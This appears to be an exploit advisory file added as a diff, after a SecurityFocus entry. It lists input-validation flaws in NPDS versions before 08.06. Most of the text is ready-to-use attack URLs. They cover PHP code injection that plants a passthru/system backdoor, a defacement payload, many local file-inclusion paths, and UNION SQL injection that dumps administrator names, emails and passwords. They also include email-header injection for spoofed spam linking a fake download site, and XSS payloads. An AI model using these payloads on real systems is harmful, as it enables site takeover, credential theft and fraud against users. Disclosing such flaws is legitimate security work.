@@ -1,0 +1,304 @@
+source: http://www.securityfocus.com/bid/33051/info
+
+NPDS is prone to multiple input-validation vulnerabilities:
+
+- Multiple local file-include vulnerabilities
+- An HTML-injection vulnerability
+- Multiple SQL-injection vulnerabilities
+- Multiple cross-site scripting vulnerabilities
+
+Exploiting these issues can allow an attacker to steal cookie-based authentication credentials, view and execute arbitrary local files within the context of the webserver, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. Other attacks may also be possible.
+
+Versions prior to NPDS 08.06 are vulnerable.
+
+http:/www.example.com/npds/modules/annonces/config.php?admin=1&tit=";%0Apassthru(stripslashes(urldecode($_GET[&#039;cmd&#039;])));%0Aecho%20"
+/npds/modules/annonces/config.php
+Create backdoor and/or inject code into connect.inc.php file
+
+
+ BACKDOOR PHP
+ http:/www.example.com/npds/modules/last-fm/admin/adm_save.php?ModPath=../../../../../test.php%00&lastfm_username=";%0Asystem($_GET[&#039;dir&#039;]);%0Aecho%20"
+
+ DEFACE
+ http:/www.example.com/npds/modules/last-fm/admin/adm_save.php?ModPath=../../../../../index.html%00&lastfm_username=";%0APHP?><html><big><big>OWNED%20BY%20NOSP
+!!!</big></big></html><?php
+/npds/modules/last-fm/admin/adm_save.php
+Create backdoor and/or inject code into security.log file
+
+ <form name="fileU" method="post" enctype="multipart/form-data" action="http:/www.example.com/npds/modules/upload/upload.php">Fichier : <input
+class="TEXTBOX_STANDARD" type="file" name="file1" size="50" maxlength="255">
+ <input class="TEXTBOX_STANDARD" type="submit" value="OK">
+ <input type="hidden" name="MAX_FILE_SIZE" value="200000">
+ <input type="hidden" name="op" value="upload">
+ <input type="hidden" name="numero" value="0">
+ <input type="hidden" name="ficname" value="test.txt">
+ <input type="hidden" name="name_tmp" value="<? phpinfo(); ?>">
+ </form>
+/npds/modules/upload/upload.php
+Create backdoor and/or inject code into security.log file
+
+ http:/www.example.com/npds/footer.php?Default_Theme=../logs\security.log%00
+/npds/footer.php
+Include
+
+ http:/www.example.com/npds/modules/annonces/affi_ann.php?ModPath=../../logs/security.log%00
+/npds/modules/annonces/affi_ann.php
+Include
+
+ http:/www.example.com/npds/modules/annonces/affi_img.php?ModPath=../../logs/security.log%00
+/npds/modules/annonces/affi_img.php
+Include
+
+ http:/www.example.com/npds/modules/affiche.php?ModPath=../../logs/security.log%00
+/npds/modules/annonces/affiche.php
+Include
+
+ http:/www.example.com/npds/modules/annul.php?ModPath=../../logs/security.log%00&
+/npds/modules/annul.php
+Include
+
+ http:/www.example.com//npds/modules/block_partenaires.php?language=../../../../../../logs/security.log%00
+/npds/modules/block_partenaires.php
+Include
+
+ http:/www.example.com/npds/modules/chargement.php?ModPath=../../logs/security.log%00
+/npds/modules/chargement.php
+Include
+
+\
+ http:/www.example.com/npds/modules/deezer/admin/index.php?ModPath=../../../../logs/security.log%00 OU
+http:/www.example.com/npds/modules/deezer/admin/index.php?language=../../../../../../logs/security.log%00
+/npds/modules/deezer/admin/index.php
+Include
+
+ http:/www.example.com/npds/modules/deezer/deezer.php?language=../../../../../logs/security.log%00
+/npds/modules/deezer/deezer.php
+Include
+
+ http:/www.example.com/npds/modules/deezer/deezermod.php?language=../../../../logs/security.log%00
+/npds/modules/deezer/deezermod.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/admin/adm_ann.php?ModPath=../../../../../../logs/security.log%00
+/npds/modules/G-annonces/admin/adm_ann.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/admin/?ModPath=../../../../../../logs/security.log%00
+/npds/modules/G-annonces/admin/index.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/annonce_form.php?ModPath=../../../logs/security.log%00
+/npds/modules/G-annonces/annonce_form.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/index.php?ModPath=../../../../../logs/security.log%00
+/npds/modules/G-annonces/index.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/list_ann.php?ModPath=../../../../../logs/security.log%00
+/npds/modules/G-annonces/list_ann.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/modif_ann.php?ModPath=../../../../../logs/security.log%00
+/npds/modules/G-annonces/modif_ann.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/search.php?ModPath=../../../../../logs/security.log%00
+/npds/modules/G-annonces/search.php
+Include
+
+ http:/www.example.com/npds/modules/GS-annonces/print.php?ModPath=../../../logs/security.log%00
+/npds/modules/GS-annonces/print.php
+Include
+
+ http:/www.example.com/npds/modules/last-fm/admin/adm.php?ModPath=../../../../logs/security.log%00 OU
+http:/www.example.com/npds/modules/last-fm/admin/adm.php?language=../../../../../logs/security.log%00
+/npds/modules/last-fm/admin/adm.php
+Include
+
+ http:/www.example.com/npds/modules/last-fm/admin/adm_save.php?ModPath=../../../../../logs/security.log%00
+/npds/modules/last-fm/admin/adm_save.php
+Include
+
+
+ http:/www.example.com/npds/modules/last-fm/error.php?ModPath=../../../../logs/security.log%00 ET
+http:/www.example.com/npds/modules/last-fm/error.php?language=../../../../../logs/security.log%00
+/npds/modules/last-fm/error.php
+Include
+
+ http:/www.example.com/npds/modules/last-fm/last-fm.php?language=../../../../../../logs/security.log%00
+/npds/modules/last-fm/last-fm.php
+Include
+
+ http:/www.example.com/npds/modules/links/admin/create_tables.php?ModPath=../../../../logs/security.log%00/admin%00
+/npds/modules/links/admin/create_tables.php
+Include
+
+ http:/www.example.com/npds/modules/saisie.php?user=1&ModPath=../../logs/security.log%00
+/npds/modules/saisie.php
+Include
+
+ http:/www.example.com/npds/modules/td-galerie/admin/adm.php?ModPath=../../../.././logs/security.log%00
+/npds/modules/td-galerie/admin/adm.php
+Include
+
+ http:/www.example.com/npds/modules/td-glossaire/glossadmin.php?ModPath=../../../logs/security.log%00 OU
+http:/www.example.com/npds/modules/td-glossaire/glossadmin.php?language=../../../../../logs/security.log%00
+/npds/modules/td-glossaire/glossadmin.php
+Include
+
+ http:/www.example.com/npds/modules/td-glossaire/glossaire.php?ModPath=../../../logs/security.log%00 OU
+http:/www.example.com/npds/modules/td-glossaire/glossaire.php?language=../../../../../logs/security.log%00
+/npds/modules/td-glossaire/glossaire.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/admin/livradmin.php?language=../../../../../../../logs/security.log%00
+/npds/modules/td-livredor/admin/livradmin.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/envoi.php?ModPath=../../../logs/security.log%00OUhttp:/www.example.com/npds/modules/td-livredor/envoi.php?language=..
+/../../../logs/security.log%00
+/npds/modules/td-livredor/envoi.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/error.php?ModPath=../../../logs/security.log%00OUhttp:/www.example.com/npds/modules/td-livredor/error.php?language=..
+/../../../logs/security.log%00
+/npds/modules/td-livredor/error.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/error.php?ModPath=../../../logs/security.log%00OUhttp:/www.example.com/npds/modules/td-livredor/error.php?language=..
+/../../../logs/security.log%00
+/npds/modules/td-livredor/error.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/livre.php?language=../../../../../logs/security.log%00
+/npds/modules/td-livredor/livre.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/livre.php?language=../../../../../logs/security.log%00
+/npds/modules/td-livredor/livre.php
+Include
+
+ http:/www.example.com/npds/modules/td-livredor/livre.php?language=../../../../logs/security.log%00
+/npds/modules/td-livredor/livre.php
+Include
+
+ http:/www.example.com/npds/modules/TvGuide/index.php?ModPath=../../../logs/security.log%00
+ http:/www.example.com/npds/modules/TvGuide/index.php?language=../../../logs/security.log%00
+/npds/modules/TvGuide/index.php
+Include
+
+ http:/www.example.com/npds/modules/G-annonces/modif_ann.php?ModPath=../../../index.php%00&op=modifier&HTTP_POST_VARS[code]=60000&id=1&table_annonces=annonces&
+HTTP_POST_VARS[tel]=Owned%20!!
+/npds/modules/G-annonces/modif_ann.php
+Modify all comment without login/password
+
+ http:/www.example.com/npds/friend.php?op=SendSite&yname=bill%20gates%20<ex_pdg@microsoft.com>%0ATo:victime@poor.fr%0ASubject%20:%20XP%20SP%203%0A%0ADownload%2
+0last%20SP%203%20for%20Win%20XP%20in%20www.fakewebsite.com%0A&ymail=ex_pdg@microsoft.com&fname=jfl%0A&fmail=victim2@poor.net
+/npds/friend.php
+Send fake mail, spam
+
+
+ http:/www.example.com/npds/modules/G-annonces/index.php?ModPath=../../../index.php%00&ble_annonces=`users`/*
+/npds/modules/G-annonces/index.php
+SQL Inject
+
+ http:/www.example.com/npds/modules/G-annonces/list_ann.php?ModPath=../../../index.php%00&table_annonces=annonces%20UNION%20SELECT%200,0,0,CONCAT(aid,char(58),
+name,char(58),url,char(58),email,char(58),pwd,char(58)),0,0,0,0,0%20FROM%20authors/*
+/npds/modules/G-annonces/list_ann.php
+SQL Inject
+
+ http:/www.example.com/npds/modules/G-annonces/search.php?ModPath=../../../index.php%00&HTTP_POST_VARS[action]=ajouter&table_annonces=annonces%20UNION%20SELECT
+%200,0,CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char(58)),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char
+(58)),0,0,0,0,0%20FROM%20authors/*
+/npds/modules/G-annonces/search.php
+SQL Inject
+
+ http:/www.example.com/npds/modules/G-annonces/index.php?ModPath=../../../index.php%00&table_cat=annonces_cat%20UNION%20SELECT%20CONCAT(aid,char(58),name,char(
+58),url,char(58),email,char(58),pwd,char(58)),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char(58))%20FROM%20authors/*&table_annonc
+es=`annonces`http:/www.example.com/npds/modules/G-annonces/index.php?ModPath=../../../index.php%00&table_cat=faqcategories%20UNION%20SELECT%20CONCAT(aid,char(5
+8),name,char(58),url,char(58),email,char(58),pwd,char(58)),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char(58))%20FROM%20authors/*
+&table_annonces=`annonces` WHERE `date`<1/*
+/npds/modules/G-annonces/index.php
+SQL Inject
+
+ECT%200,0,CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char(58)),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,c
+har(58)),0,0,0,0,0%20FROM%20authors/*
+/npds/modules/G-annonces/modif_ann.php
+SQL Inject
+
+ http:/www.example.com/npds/modules/G-annonces/admin/adm_ann.php?ModPath=../../../../mainfile.php%00&id_user=1&table_annonces=annonces%20UNION%20SELECT%20CONCA
+T(aid,char(58),name,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name
+,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(
+58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),
+pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd),CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd)%20FROM%20autho
+rs/*
+/npds/modules/G-annonces/admin/adm_ann.php
+SQL Inject & Include
+
+ http:/www.example.com/npds/modules/G-annonces/admin/adm_cat.php?ModPath=../../../../../../npds/index.php%00&HTTP_POST_VARS[action]=ajouter&HTTP_POST_VARS[tabl
+e_cat]=%20`users_status`%20(%20`posts`%20,%20`attachsig`%20,%20`rank`%20,%20`level`%20,%20`open`)%20VALUES%20(1,%200,%200,%202,%201)/* OU RECUP DE MOT DE
+PASSE ROOT
+http:/www.example.com/npds/modules/G-annonces/admin/adm_cat.php?ModPath=../../../../mainfile.php%00&HTTP_POST_VARS[action]=ajouter&HTTP_POST_VARS[table_cat]=fa
+qcategories%20UNION%20SELECT%20CONCAT(aid,char(58),name,char(58),url,char(58),email,char(58),pwd,char(58)),CONCAT(aid,char(58),name,char(58),url,char(58)
+,email,char(58),pwd,char(58))%20FROM%20authors/*
+/npds/modules/G-annonces/admin/adm_cat.php
+SQL Inject & Include
+
+ http:/www.example.com/npds/modules/G-annonces/admin/?ModPath=../../../../../../npds/index.php%00&table_cat=`test_hack_npds`%20(%20id_cat%20mediumint(11)%20NOT
+%20NULL%20auto_increment,%20categorie%20int(3)%20NOT%20NULL%20default%201,%20KEY%20id%20(id_cat))/*
+/npds/modules/G-annonces/admin/index.php
+SQL Inject & Include
+
+ http:/www.example.com/npds/modules/G-annonces/annonce_form.php?ModPath=../../../logs/security.log%00
+/npds/modules/G-annonces/annonce_form.php
+SQL Inject & Include
+
+ XSS non permanent
+/npds/modules/annonces/affi_ann.php
+XSS
+
+ XSS non permanent
+/npds/modules/annonces/affiche.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/admin/adm_ann.php?mess_acc=%3Cscript>alert("test");%3C/script>
+/npds/modules/G-annonces/admin/adm_ann.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/admin/adm_cat.php?mess_acc=%3Cscript>alert("test");%3C/script>
+/npds/modules/G-annonces/admin/adm_cat.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/annonce_form.php?mess_acc=%3Cscript>alert(&#039;test&#039;);%3C/script>
+/npds/modules/G-annonces/annonce_form.php
+XSS
+
+http:/www.example.com/npds/modules/G-annonces/index.php?mess_acc=%3Cscript>alert(&#039;test&#039;);%3C/script>
+/npds/modules/G-annonces/index.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/list_ann.php?mess_acc=%3Cscript>alert(&#039;test&#039;);%3C/script>
+/npds/modules/G-annonces/list_ann.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/modif_ann.php?mess_acc=%3Cscript>alert(&#039;test&#039;);%3C/script>
+/npds/modules/G-annonces/modif_ann.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/search.php?mess_acc=%3Cscript>alert(&#039;test&#039;);</script>
+/npds/modules/G-annonces/search.php
+XSS
+
+ http:/www.example.com/npds/modules/G-annonces/admin/index.php?mess_acc=%3Cscript>alert("test");%3C/script>
+/npds/modules/GS-annonces/admin/index.php
+XSS
+
+ http:/www.example.com/npds/modules/Top10/top10.php?bgcolor2=green"><script>alert(&#039;test&#039;);</script>
+/npds/modules/Top10/top10.php
+XSS
+
+ http:/www.example.com/npds/themes/npds2004/footer.php?theme="><script>alert(&#039;test&#039;);</script>
+/npds/themes/npds2004/footer.php
+XSS
+
